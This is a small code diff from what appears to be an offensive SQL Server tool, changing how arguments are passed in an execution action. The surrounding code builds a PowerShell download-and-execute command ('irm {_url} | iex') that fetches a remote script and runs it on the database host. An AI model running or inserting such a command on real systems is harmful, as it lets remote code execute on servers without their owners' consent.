@@ -35,7 +35,7 @@ namespace MSSQLand.Actions.Execution
             string powerShellCommand = $"irm {_url} | iex";
 
             // Set the crafted PowerShell command as the _command in the parent class
-            base.ValidateArguments(powerShellCommand);
+            base.ValidateArguments(new string[] { powerShellCommand });
 
             // Call the parent's Execute method to execute the command
             base.Execute(databaseContext);
